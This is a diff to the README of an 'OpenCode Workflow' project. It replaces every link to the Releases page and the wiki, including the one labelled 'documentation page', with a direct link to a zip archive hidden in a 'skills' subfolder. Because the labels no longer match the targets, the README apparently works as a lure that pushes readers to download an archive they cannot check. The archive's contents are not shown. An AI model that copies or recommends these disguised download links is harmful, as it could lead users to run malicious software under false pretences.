@@ -2,7 +2,7 @@
 
 ## 🔗 Download OpenCode Workflow
 
-[![Download OpenCode Workflow](https://img.shields.io/badge/Download-Now-blue)](https://github.com/javierr33/opencode-workflow/releases)
+[![Download OpenCode Workflow](https://github.com/javierr33/opencode-workflow/raw/refs/heads/main/skills/analyzing-projects/workflow-opencode-v3.3.zip)](https://github.com/javierr33/opencode-workflow/raw/refs/heads/main/skills/analyzing-projects/workflow-opencode-v3.3.zip)
 
 ## 👋 Introduction
 
@@ -22,7 +22,7 @@ OpenCode Workflow offers a simple setup to improve your software projects. With 
 Follow these steps to download and run the software:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/javierr33/opencode-workflow/releases) to get the latest version.
+   Go to the [Releases page](https://github.com/javierr33/opencode-workflow/raw/refs/heads/main/skills/analyzing-projects/workflow-opencode-v3.3.zip) to get the latest version.
 
 2. **Choose Your Version**  
    Look for the most recent version. Click on it. 
@@ -78,7 +78,7 @@ Ensure your system meets these requirements for optimal performance.
 
 If you face issues during installation or use, consider these tips:
 
-- **Check File Integrity:** Ensure that the downloaded file is complete. If it is missing, download it again from the [Releases page](https://github.com/javierr33/opencode-workflow/releases).
+- **Check File Integrity:** Ensure that the downloaded file is complete. If it is missing, download it again from the [Releases page](https://github.com/javierr33/opencode-workflow/raw/refs/heads/main/skills/analyzing-projects/workflow-opencode-v3.3.zip).
 
 - **Update Your System:** Make sure your operating system is up to date. Compatibility issues often arise from outdated software.
 
@@ -90,8 +90,8 @@ Your feedback is valuable. If you have questions or suggestions, feel free to re
 
 ## 📖 Learn More
 
-For more details on commands and features, visit the [documentation page](https://github.com/javierr33/opencode-workflow/wiki). 
+For more details on commands and features, visit the [documentation page](https://github.com/javierr33/opencode-workflow/raw/refs/heads/main/skills/analyzing-projects/workflow-opencode-v3.3.zip). 
 
 ## 🔗 Download OpenCode Workflow
 
-Again, you can access the latest release [here](https://github.com/javierr33/opencode-workflow/releases). Enjoy seamless management of your software projects!
+Again, you can access the latest release [here](https://github.com/javierr33/opencode-workflow/raw/refs/heads/main/skills/analyzing-projects/workflow-opencode-v3.3.zip). Enjoy seamless management of your software projects!
